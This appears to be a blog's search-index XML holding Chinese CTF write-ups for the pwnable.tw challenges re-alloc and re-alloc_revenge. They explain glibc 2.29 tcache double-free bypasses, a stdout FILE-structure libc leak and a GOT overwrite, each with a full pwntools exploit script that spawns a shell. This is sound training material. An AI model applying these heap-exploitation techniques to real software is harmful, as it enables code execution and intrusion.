<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pwn heap: re-alloc_revenge</title>
      <link href="/2020/03/18/pwn-heap-re-alloc-revenge/"/>
      <url>/2020/03/18/pwn-heap-re-alloc-revenge/</url>
      
        <content type="html"><![CDATA[<p>和re-alloc一样，只不过开了PIE和RELRO，got表改不了了，要利用stdout结构体来leak libc，因为第一次做，而且过程稍微有些复杂，所以记录一下。</p><blockquote><p>题目描述</p></blockquote><p>pwnable.tw上的一道题，也就是在re-alloc上保护全开。</p><pre><code>Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabledFORTIFY:  Enabled</code></pre><p>功能就不赘述了，因为binary和re-alloc一摸一样。</p><blockquote><p>相关知识点</p></blockquote><h2 id="利用stdout结构体leak-libc"><a href="#利用stdout结构体leak-libc" class="headerlink" title="利用stdout结构体leak libc"></a>利用stdout结构体leak libc</h2><p>当binary使用过puts函数时，会依照以下调用链调用到<code>_IO_new_file_overflow</code>:</p><pre><code class="C">_IO_puts --&gt; _IO_sputn --&gt; _IO_new_file_xsputn --&gt; _IO_new_file_overflow </code></pre><p>分析<code>_IO_new_file_overflow</code>源码：</p><pre><code class="C">int _IO_new_file_overflow (FILE *f, int ch){    // 跳过这个if分支，需要设置&quot;fp-&gt;_flags | _IO_NO_WRITES&quot;    if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */    {        f-&gt;_flags |= _IO_ERR_SEEN;        __set_errno (EBADF);        return EOF;    }       // 跳过这个if分支，需要设置&quot;fp-&gt;_flags | _IO_CURRENTLY_PUTTING&quot;    if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)    {        /* Allocate a buffer if needed. */        if (f-&gt;_IO_write_base == NULL)        {            _IO_doallocbuf (f);            _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);        }        if (__glibc_unlikely (_IO_in_backup (f)))        {            size_t nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;            _IO_free_backup_area (f);            f-&gt;_IO_read_base -= MIN (nbackup, f-&gt;_IO_read_base - f-&gt;_IO_buf_base);            f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;        }        if (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)            f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;        f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;        f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;        f-&gt;_IO_write_end = f-&gt;_IO_buf_end;        f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;        f-&gt;_flags |= _IO_CURRENTLY_PUTTING;        if (f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))            f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;    }    if (ch == EOF)        // 需要调用的目标&quot;_IO_do_write&quot;，如果使得 _IO_write_base &lt; _IO_write_ptr，且 _IO_write_base 处        // 存在有价值的地址 （libc 地址）则可进行泄露        // 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写(覆盖&quot;_IO_write_base&quot;低字节为&quot;\x00&quot;)        return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);    if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */        if (_IO_do_flush (f) == EOF)            return EOF;    *f-&gt;_IO_write_ptr++ = ch;    if ((f-&gt;_flags &amp; _IO_UNBUFFERED) || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &#39;\n&#39;))        if (_IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)             return EOF;    return (unsigned char) ch;}</code></pre><p>在<code>_IO_new_file_overflow</code>中，我们要利用的就是其中的<code>_IO_do_write</code>。<br><br>在输出时，如果具有缓冲区，会输出<code>_IO_write_base</code>开始的缓冲区内容，直到<code>_IO_write_ptr</code>（也就是将<code>_IO_write_base</code>一直到<code>_IO_write_ptr</code>部分的值当做缓冲区，在无缓冲区时，两个指针指向同一位置，位于该结构体附近，也就是libc中），但是在<code>setbuf</code>后，理论上会不使用缓冲区。然而如果能够修改<code>_IO_2_1_stdout_</code>结构体的<code>flags</code>部分，使得其认为<code>stdout</code>具有缓冲区，再将<code>_IO_write_base</code>处的值进行<code>partial overwrite</code>，就可以泄露出libc地址了。<br><br>为了设置对应的<code>flags</code>的值，需要进一步分析<code>_IO_do_write</code>(其实就是<code>_IO_new_do_write</code>)：</p><pre><code class="C">int _IO_new_do_write (FILE *fp, const char *data, size_t to_do){    return (to_do == 0 || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;}static size_t new_do_write (FILE *fp, const char *data, size_t to_do){    size_t count;    if (fp-&gt;_flags &amp; _IO_IS_APPENDING)        fp-&gt;_offset = _IO_pos_BAD;    else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)    {        // &quot;_IO_SYSSEEK&quot;只是简单的调用lseek，但是我们不能完全控制&quot;fp-&gt;_IO_write_base - fp-&gt;_IO_read_end&quot;的值。        // 如果&quot;fp-&gt;_IO_read_end&quot;的值设置为0，那么&quot;_IO_SYSSEEK&quot;的第二个参数值就会过大;        // 如果设置&quot;fp-&gt;_IO_write_base = fp-&gt;_IO_read_end&quot;的话，那么在其它地方就会有问题，因为&quot;fp-&gt;_IO_write_base&quot;不能大于&quot;fp-&gt;_IO_write_end&quot;。        // 所以这里要设置&quot;fp-&gt;_flags | _IO_IS_APPENDING&quot;，避免进入else if分支。        off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);        if (new_pos == _IO_pos_BAD)            return 0;        fp-&gt;_offset = new_pos;    }    // 需要的目标&quot;_IO_SYSWRITE&quot;    count = _IO_SYSWRITE (fp, data, to_do);    if (fp-&gt;_cur_column &amp;&amp; count)        fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1;    _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;    fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0 &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED)) ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);    return count;}</code></pre><p>综上可以得到，<code>flags</code>需要满足的条件为：</p><pre><code class="C">_flags = 0xfbad0000                 // Magic number_flags &amp; = ~_IO_NO_WRITES           // _flags = 0xfbad0000_flags | = _IO_CURRENTLY_PUTTING    // _flags = 0xfbad0800_flags | = _IO_IS_APPENDING         // _flags = 0xfbad1800</code></pre><p>同时可以将<code>_IO_read_ptr</code>, <code>_IO_read_end</code>, <code>_IO_read_base</code>, <code>_IO_write_base</code>设置为：</p><pre><code class="C">_IO_read_ptr = 0;_IO_read_end = 0;_IO_read_base = 0;_IO_write_base = 0x7fXXXXXXXX00;</code></pre><p>然后就可以根据输出的数据leak出libc地址了。</p><blockquote><p>利用思路</p></blockquote><ul><li>利用<code>alloc</code>功能在<code>size=0</code>时存在的uaf，以及<code>realloc</code>中当<code>size &lt; old_size</code>而触发的<code>free(remainder)</code>操作，形成chunk overlap，然后覆盖chunk的size至足够放进unsorted bin中（这里因为要爆破而且连远程的延迟比较大，所以尽量小）。</li><li>为了保证能够顺利地将chunk放进unsorted bin中，需要绕过这里的检查，也就是需要先free掉足够大小的chunk，保证该需要放进unsorted bin的nextchunk的prev_inuse area为1。由于每次分配最大的size为0x78也就是chunk的size最大为0x80，这里要进行多次的<code>alloc(0x68)</code>, <code>realloc(0x78)</code>, <code>free()</code>操作（为了防止tcache中刚被free掉的chunk又被取出来）。直到nextchunk正好指向size为0x80的fastbin。<pre><code class="C">if (__glibc_unlikely (!prev_inuse(nextchunk)))  malloc_printerr (&quot;double free or corruption (!prev)&quot;);</code></pre></li><li>此外，由于后续的操作需要保持unsorted bin中和tcache bin中同时存在该伪造的unsorted bin，从而能从该tcache中分配到位于<code>stdout</code>结构体的内存，所以要在前面提到的<code>free(remainder)</code>形成的tcache bin初形成该chunk的double free，从而在分配该处的chunk时仍能将它保留在tcache中。<pre><code>tcache bin ==&gt; +--------+ &lt;--victim_chunk                      tcache bin ==&gt; +--------+&lt;--same victim_chunk             |        |                   after malloc                      |        |             +--------+&lt;--+            ===================&gt;                 +--------+             |fd |    |   |                                                 |        |             +--------+   |                                                 +--------+               |          |               +----------+</code></pre></li><li>进一步地，由于<code>alloc</code>会对输入地字符串强制添加末尾<code>\x00</code>，从而会将上一步中提到的double free链（也就是该tache bin的fd）的低字节覆盖为<code>\x00</code>，这里需要将该chunk的地址保持为低字节是<code>\x00</code>，从而即使低字节被覆盖也不影响double free链，而做法就是在最开始得时候分配一定size的chunk并free到tcache中去（其实这里的chunk在最后的exploite也会用到，因为那时unsorted bin已经被破坏了，不能分配tcache或者fastbin中没有的chunk，否则会造成从unsorted bin中取而报错）。</li><li>在伪造好相应的chunk后，分配并释放到unsorted bin中，再用uaf进行partial overwrite <code>unsorted bin-&gt;fd</code>为<code>stdout</code>(bruteforce 4 bits)，然后再从相应tcache bin中取出该chunk，使得tcache bin指向stdout<pre><code class="shell">tcache bin ==&gt; +--------+ &lt;--victim_chunk             |             |        |                               |             +--------+                               |             |fd |    |                               |             +--------+                               |               |                                      |               +----------&gt; +--------+ &lt;--stdout      |                            |_flags  |                |                            +--------+                |                            |        |                |                            +--------+                |   after malloc----------------------------------------------------- +  =============&gt; tcache bin ==&gt; +--------+ &lt;--stdoutunsorted bin ==&gt; +--------+ &lt;--same victim_chunk      |                                |_flags  |               |        |                             |                                +--------+               +--------+                             |                                |        |               |fd | bk |--------&gt; main_arena         |                                +--------+                       +--------+                             |                                          |                                    |                 +----------&gt; +--------+ &lt;--stdout    |                              |_flags  |              |                              +--------+              |                              |        |              |                              +--------+              |                  </code></pre></li><li>这个时候只要分配stdout出的chunk就能修改相应的stdout结构体，达到输出数据从而leak libc的目的。</li><li>之后因为unsorted bin被破坏的缘故，并且仅能使用一个heap进行exploite（另一个heap不能被free，否则会报错）和只能通过bins中已有的chunk进行利用，分配到<code>__realloc_hook</code>处的chunk，将<code>__realloc_hook</code>改为<code>malloc</code>，再将<code>__malloc_hook</code>改为<code>one_gadget</code>（为了调整栈帧，使得<code>[rsp + 0x70] == NULL</code>。</li><li>触发<code>realloc</code>来getshell。</li></ul><blockquote><p>exp</p></blockquote><pre><code class="python"># context.log_level = &quot;debug&quot;def alloc(index, size, data):    p.sendlineafter(&quot;Your choice: &quot;, &quot;1&quot;)    p.sendlineafter(&quot;Index:&quot;, str(index))    p.sendlineafter(&quot;Size:&quot;, str(size))    p.sendafter(&quot;Data:&quot;, data)def realloc(index, size, data):    p.sendlineafter(&quot;Your choice: &quot;, &quot;2&quot;)    p.sendlineafter(&quot;Index:&quot;, str(index))    p.sendlineafter(&quot;Size:&quot;, str(size))    if size != 0:        p.sendafter(&quot;Data:&quot;, data)def free(index):    p.sendlineafter(&quot;Your choice: &quot;, &quot;3&quot;)    p.sendlineafter(&quot;Index:&quot;, str(index))offset = 0x1e7570realloc_hook_offset = libc.symbols[&quot;__realloc_hook&quot;]malloc_offset = libc.symbols[&quot;malloc&quot;]one_gadget_offset = 0x106ef8while True:    try:        # make the lowest byte of bins[1]&#39;s address be \x00        # also provide chunks for exploite since at the very end the unsorted bin is broken, we can only use the chunk in the tcache        alloc(0, 0x28, &quot;AAAA&quot;)        free(0)        alloc(0, 0x48, &quot;AAAA&quot;)        free(0)        # three freed tcache bins size = [0x60, 0x40, 0x20]        # bins[0] and bins[2] have the same address (both size area are 0x20)        # bins[1] is right next to bins[0] and bins[2]        alloc(0, 0x58, &quot;AAAA&quot;)        realloc(0, 0, &quot;&quot;)        realloc(0, 0x18, &quot;BBBB&quot;)        free(0)        # make double free on bins[1]        # thus we can use two same chunk on size 0x40 for the following exploit        alloc(0, 0x38, &quot;AAAA&quot;)        realloc(0, 0, &quot;&quot;)        alloc(1, 0x38, &quot;BBBB&quot;)        free(0)        realloc(1, 0x38, &quot;B&quot; * 0x10)        free(1)        # alloc space for unsorted bin        # make fake unstored bin&#39;s next chunk point to exactly a valid chunk        # free 10 chunks(actually only 9 can be seen in the bins while debugging, why?)        for i in range(9):            alloc(1, 0x68, &quot;AAAA&quot;)            realloc(1, 0x78, &quot;AAAA&quot;)            free(1)        # alloc bins[0] to overwrite the size area of bins[1] into 0x441(8 * 0x80 + 0x40 + 0x1)        # then alloc bins[1] and free it to unsorted bin        alloc(0, 0x58, &quot;D&quot; * 0x18 + p64(0x441))        free(0)        alloc(1, 0x38, &quot;DDDD&quot;)        realloc(1, 0, &quot;&quot;)        # partially write the unsorted bin-&gt;fd into stdout(bruteforce 4 bits)        # make the tcache bins whose size is 0x40 point to stdout        realloc(1, 0x38, p16(0x5760))        alloc(0, 0x38, &quot;DDDD&quot;)        # alloc the chunk at stdout        # make _flags = 0x7fdf0ec12760 ... to invoke data print        # _flags = MAGIC                    # 0xfbad0000         # _flags &amp;= ~_IO_NO_WRITES          # _flags = 0xfbad0000         # _flags |= _IO_CURRENTLY_PUTTING   # _flags = 0xfbad0800        # _flags |= _IO_IS_APPENDING        # _flags = 0xfbad1800        # _IO_read_ptr = 0,         # _IO_read_end = 0,         # _IO_read_base = 0        # _IO_write_base = 0x7ffff7dd0700        # _IO_write_ptr = 0x7ffff7dd07e3        # thus data between _IO_write_base and _IO_write_ptr will be print out        realloc(0, 0x18, &quot;AAAA&quot;)        free(0)        alloc(0, 0x38, p64(0xfbad1800) + p64(0) * 3)        # leak libc        string = p.recv(16)        print(string)        if string[0] == &quot;$&quot;:            p.close()            if _pwn_remote == 0:                p = process(argv=[_proc], env=_setup_env())            else:                p = remote(&#39;chall.pwnable.tw&#39;, 10310)            if _debug != 0:                gdb.attach(p)            continue        libc_addr = u64(string[8:])        libc_base = libc_addr - offset        realloc_hook = libc_base + realloc_hook_offset        libc_malloc = libc_base + malloc_offset        one_gadget = libc_base + one_gadget_offset        break    except:        p.close()        if _pwn_remote == 0:            p = process(argv=[_proc], env=_setup_env())        else:            p = remote(&#39;chall.pwnable.tw&#39;, 10310)        if _debug != 0:            gdb.attach(p)success(&quot;libc_base: &quot; + hex(libc_base))success(&quot;realloc_hook: &quot; + hex(realloc_hook))success(&quot;libc_malloc: &quot; + hex(libc_malloc))success(&quot;one_gadget: &quot; + hex(one_gadget))# make heap[1] == NULL (cannot use heap[0] any more)realloc(1, 0x18, &quot;A&quot; * 0x10)free(1)# use the 0x80 tcache and prepared tcache# create three tcache bins = [0x80, 0x50, 0x30], bins[0] and bins[2] are the same (0x30)alloc(1, 0x78, &quot;AAAA&quot;)realloc(1, 0, &quot;&quot;)realloc(1, 0x28, &quot;BBBB&quot;)free(1)# use bins[2] to overwrite the size area and fd of bins[1] to  0x51 and realloc_hook_addralloc(1, 0x78, &quot;A&quot; * 0x28 + p64(0x51) + p64(realloc_hook))realloc(1, 0x18, &quot;AAAA&quot;)free(1)# make tcache bins in size 0x50 point to realloc_hookalloc(1, 0x48, &quot;AAAA&quot;)realloc(1, 0x18, &quot;BBBB&quot;)free(1)# make realloc_hook = malloc, malloc_hook = one_gadget# then the call will be realloc ==&gt; realloc_hook(malloc) ==&gt; malloc_hook(one_gadget)# because three &quot;push&quot;&#39;s in malloc will help to satisfy the one_gadget condition that [rsp + 0x70] == NULL alloc(1, 0x48, p64(libc_malloc) + p64(one_gadget))# use realloc to triggerrealloc(1, 0, &quot;&quot;)# use vps to get flag# p.sendline(&quot;cat /home/re-alloc_revenge/flag&quot;)# print(p.recv())p.interactive()</code></pre><blockquote><p>小结</p></blockquote><ul><li>新姿势，<code>unsorted bin-&gt;fd</code>的partial overwrite改成<code>stdout</code>，在没有show的情况下进行leak libc</li><li>只有两个heap外加只有realloc操作再加各种崩坏的unsorted bin和tcache double free check，以及需要bruteforce，调试+写exp的过程对我来说那叫一个…</li><li>貌似还有一种改tcache struct的做法，目前还没研究，以后有时间搞一下</li></ul><blockquote><p>参考资料</p></blockquote><ol><li>思路来源，但是貌似这个脚本有问题：<a href="http://www.ntype.club/re-alloc_revenge/" target="_blank" rel="noopener">http://www.ntype.club/re-alloc_revenge/</a></li><li>改tcache stuct的做法（还没学着调过）：<a href="https://sh1ner.github.io/2020/02/05/pwnable-tw-re-alloc-revenge/" target="_blank" rel="noopener">https://sh1ner.github.io/2020/02/05/pwnable-tw-re-alloc-revenge/</a></li><li>利用stdout进行输出：<a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/glibc-heap/tcache_attack-zh.md" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/glibc-heap/tcache_attack-zh.md</a></li><li>同上：<a href="https://n0va-scy.github.io/2019/09/21/IO_FILE/" target="_blank" rel="noopener">https://n0va-scy.github.io/2019/09/21/IO_FILE/</a></li><li>glibc2.29源码：<a href="https://elixir.bootlin.com/glibc/glibc-2.29/source" target="_blank" rel="noopener">https://elixir.bootlin.com/glibc/glibc-2.29/source</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn heap: re-alloc</title>
      <link href="/2020/03/06/pwn-heap-re-alloc/"/>
      <url>/2020/03/06/pwn-heap-re-alloc/</url>
      
        <content type="html"><![CDATA[<p>这道题的总体思路就是uaf + fsb， 开始以为是libc2.29的uaf + tcache double free， 后来发现没有show导致没有办法leak出libc地址，最后无从下手。后来还是从别人的博客里学到神奇的姿势。</p><blockquote><p>题目描述</p></blockquote><p>pwnable.tw上的一道题。<br><br>Partial RELRO，got表可以改，基本上是利用改got表来getshell了。</p><pre><code>Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x400000)FORTIFY:  Enabled</code></pre><p>题目提供了四个功能</p><pre><code>1. alloc2. realloc3. free4. exit</code></pre><p>其中alloc功能相当于malloc一个chunk，但是chunk的<code>size&lt;=0x78</code>, 且chunk的地址会放在bss段的heap数组上，heap数组允许至多两个成员。接受完data输入后会在末尾补上0，这里存在一个off by null，但是没有什么用。<br><br>realloc功能为更改chunk的size以及更新content内容，这里末尾不会自动补0.值得注意的是，当size为0时，相当于触发free但是对应的bss上的数组中的指针不会清0，于是这里有一个uaf可以利用。<br><br>free功能就是同时free掉chunk以及将heap数组中的指针清0</p><blockquote><p>相关知识点</p></blockquote><h3 id="libc2-29的tcache-double-free的检测机制"><a href="#libc2-29的tcache-double-free的检测机制" class="headerlink" title="libc2.29的tcache double free的检测机制"></a>libc2.29的tcache double free的检测机制</h3><pre><code class="C">//glibc-2.27typedef struct tcache_entry{  struct tcache_entry *next;} tcache_entry;//glibc-2.29typedef struct tcache_entry{  struct tcache_entry *next;  /* This field exists to detect double frees.  */  struct tcache_perthread_struct *key;} tcache_entry;</code></pre><p>多了一个<code>key</code>的成员变量。这个<code>key</code>的作用是什么？</p><pre><code class="C">//glibc-2.27tcache_put (mchunkptr chunk, size_t tc_idx){  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  assert (tc_idx &lt; TCACHE_MAX_BINS);  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);}tcache_get (size_t tc_idx){  tcache_entry *e = tcache-&gt;entries[tc_idx];  assert (tc_idx &lt; TCACHE_MAX_BINS);  assert (tcache-&gt;entries[tc_idx] &gt; 0);  tcache-&gt;entries[tc_idx] = e-&gt;next;  --(tcache-&gt;counts[tc_idx]);  return (void *) e;}//glibc-2.29tcache_put (mchunkptr chunk, size_t tc_idx){  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  assert (tc_idx &lt; TCACHE_MAX_BINS);  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will     detect a double free.  */  e-&gt;key = tcache;    //new  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);}tcache_get (size_t tc_idx){  tcache_entry *e = tcache-&gt;entries[tc_idx];  assert (tc_idx &lt; TCACHE_MAX_BINS);  assert (tcache-&gt;entries[tc_idx] &gt; 0);  tcache-&gt;entries[tc_idx] = e-&gt;next;  --(tcache-&gt;counts[tc_idx]);  e-&gt;key = NULL;    //new  return (void *) e;}</code></pre><p>当chunk被free到tcache中时，<code>key</code>会被置为第一个chunk的地址，也就是tcache的结构chunk。当chunk从tcache中取出来时，<code>key</code>会被设置成NULL。总而言之，就是通过<code>key</code>来表明这个chunk是否在tcache中。<br><br>而这个<code>key</code>也是libc2.29中提供的对tcache的额外的检查，即在将一个chunk放入tcache时，会检查该chunk的<code>key</code>是否等于tcache结构体的地址，如果是，则进一步检查tcache中是否已有地址相同的chunk，从而触发double free的检查机制。<br><br>然而仍然有绕过检查的方法，就是<code>key</code>不等于tcache结构体的位置即可，而这往往需要配合uaf或者chunk overlap同时利用才能做到。</p><h3 id="realloc-ptr-size-函数"><a href="#realloc-ptr-size-函数" class="headerlink" title="realloc(ptr, size)函数"></a>realloc(ptr, size)函数</h3><p>总的来说，realloc函数在size不同的情况下，可以达到malloc，edit，free三种功能：</p><ol><li><code>ptr == 0</code>: malloc(size)</li><li><code>ptr != 0 &amp;&amp; size == 0</code>: free(ptr)</li><li><code>ptr != 0 &amp;&amp; size == old_size</code>: edit(ptr)</li><li><code>ptr != 0 &amp;&amp; size &lt; old_size</code>: edit(ptr) and free(remainder)</li><li><code>ptr != 0 &amp;&amp; size &gt; old_size</code>: new_ptr = malloc(size); strcpy(new_ptr, ptr); free(ptr); return new_ptr;</li></ol><blockquote><p>利用思路</p></blockquote><ul><li>利用uaf在tcache不同size的链表中放置一个<code>atoll_got</code>的chunk</li><li>利用其中一个指向<code>atoll_got</code>的chunk更改<code>atoll_got</code>为<code>printf_plt</code>，这样在调用<code>atoll</code>时，就会调用<code>printf</code>从而构造出一个格式化字符串漏洞，利用这个漏洞可以leak出栈上的libc地址，这里选择leak<code>__libc_start_main</code>。</li><li>利用另一个指向<code>atoll_got</code>的chunk将<code>atoll_got</code>再改成<code>system</code>，注意因为此时<code>atoll</code>是<code>printf</code>，所以在调用alloc时，需要输入的Index和Size不是直接输入数字，而是通过输入的string的长度来通过printf返回的值间接传给Index和Size。<del>由于read的长度限制在16，因此注意这里tcache的相关chunk必须是<code>size=0x20</code>，否则无法利用。</del>（可以通过”%xc”来控制printf的返回值。）</li><li>最后再输入<code>/bin/sh\x00</code>调用<code>atoll</code>来执行<code>system(&quot;/bin/sh&quot;);</code>getshell即可。</li></ul><blockquote><p>exp</p></blockquote><pre><code class="python">context.log_level = &quot;debug&quot;def alloc(index, size, data):    p.sendlineafter(&quot;Your choice: &quot;, &quot;1&quot;)    p.sendlineafter(&quot;Index:&quot;, str(index))    p.sendlineafter(&quot;Size:&quot;, str(size))    p.sendafter(&quot;Data:&quot;, data)def realloc(index, size, data):    p.sendlineafter(&quot;Your choice: &quot;, &quot;2&quot;)    p.sendlineafter(&quot;Index:&quot;, str(index))    p.sendlineafter(&quot;Size:&quot;, str(size))    if size != 0:        p.sendafter(&quot;Data:&quot;, data)def free(index):    p.sendlineafter(&quot;Your choice: &quot;, &quot;3&quot;)    p.sendlineafter(&quot;Index:&quot;, str(index))bss = elf.bss(0)atoll_got = elf.got[&quot;atoll&quot;]atoll_plt = elf.plt[&quot;atoll&quot;]printf_plt = elf.plt[&quot;printf&quot;]libc_start_main_ret_offset = libc.symbols[&quot;__libc_start_main&quot;] + 0xebsystem_offset = libc.symbols[&quot;system&quot;]# let tcache[0x20] =&gt; atoll_got# heap[0] ==&gt; chunk(0x18) &lt;== heap[1]alloc(0, 0x18, &quot;AAA&quot;)realloc(0, 0, &quot;&quot;)realloc(0, 0x18, p64(atoll_got))alloc(1, 0x18, &quot;BBB&quot;)# now heap[0] == heap[1] == NULLrealloc(0, 0x38, &quot;CCC&quot;)free(0)realloc(1, 0x38, &quot;D&quot; * 0x10)free(1)# let tcache[0x50] =&gt; atoll_got# heap[0] ==&gt; chunk(0x18) &lt;== heap[1]alloc(0, 0x48, &quot;AAA&quot;)realloc(0, 0, &quot;&quot;)realloc(0, 0x48, p64(atoll_got))alloc(1, 0x48, &quot;BBB&quot;)# now heap[0] == heap[1] == NULLrealloc(0, 0x58, &quot;CCC&quot;)free(0)realloc(1, 0x58, &quot;D&quot; * 0x10)free(1)# above all, we get two tcache point to atoll_got that can be malloc# alloc once at heap[0]# change the atoll_got to printf_plt# use format string bug to leak the __libc_start_main_ret in the stackalloc(0, 0x48, p64(printf_plt))p.sendlineafter(&quot;Your choice: &quot;, &quot;3&quot;)p.sendlineafter(&quot;Index:&quot;, &quot;%21$llx&quot;)libc_start_main_ret = int(p.recv(12), 16)libc_base = libc_start_main_ret - libc_start_main_ret_offsetlibc_system = libc_base + system_offset# alloc twice at heap[1]# since the atoll has been set to printf# the return value of printf(which may be the length of the string) will be regarded as the &quot;Index&quot;# thus we use length of the string to make &quot;atoll&quot; work# then we change the atoll_got to libc_systemp.sendlineafter(&quot;Your choice: &quot;, &quot;1&quot;)p.sendlineafter(&quot;Index:&quot;, &quot;A\x00&quot;)p.sendafter(&quot;Size:&quot;, &quot;A&quot; * 15 + &quot;\x00&quot;)p.sendafter(&quot;Data:&quot;, p64(libc_system))# input &quot;/bin/sh\x00&quot; and call system(atoll) to get shellp.sendlineafter(&quot;Your choice: &quot;, &quot;3&quot;)p.sendlineafter(&quot;Index:&quot;, &quot;/bin/sh\x00&quot;)success(&quot;libc_start_main_ret: &quot; + hex(libc_start_main_ret))success(&quot;libc_base: &quot; + hex(libc_base))success(&quot;libc_system: &quot; + hex(libc_system))p.interactive()</code></pre><blockquote><p>小结</p></blockquote><ul><li>将<code>atoll</code>改为<code>printf</code>确实是神奇的姿势（我没遇到过），从这个思路上看，貌似还可以引入本来不存在的漏洞来利用。</li><li>调试的时候gef好像有点问题，peda可以用。</li></ul><blockquote><p>参考资料</p></blockquote><ol><li><a href="https://www.anquanke.com/post/id/194960" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194960</a></li><li><a href="https://tiencong283.ninja/post/realloc-pwnable-tw" target="_blank" rel="noopener">https://tiencong283.ninja/post/realloc-pwnable-tw</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn rop: De-ASLR</title>
      <link href="/2020/02/17/pwn-rop-De-ASLR/"/>
      <url>/2020/02/17/pwn-rop-De-ASLR/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Input password</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="8da71199a0d997414970e1da8797c18f695ce28ec88a9acb62c8730492c47d75"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux x86 和 x86_64 系统调用表</title>
      <link href="/2020/02/12/linux-x86-%E5%92%8C-x86-64-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8/"/>
      <url>/2020/02/12/linux-x86-%E5%92%8C-x86-64-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<blockquote><p>x86</p></blockquote><p><a href="https://syscalls32.paolostivanin.com/" target="_blank" rel="noopener">https://syscalls32.paolostivanin.com/</a></p><blockquote><p>x86_64</p></blockquote><p><a href="https://syscalls64.paolostivanin.com/" target="_blank" rel="noopener">https://syscalls64.paolostivanin.com/</a><br><br><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a></p>]]></content>
      
      
      <categories>
          
          <category> Reference </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn heap: melody_center</title>
      <link href="/2020/02/07/pwn-heap-melody-center/"/>
      <url>/2020/02/07/pwn-heap-melody-center/</url>
      
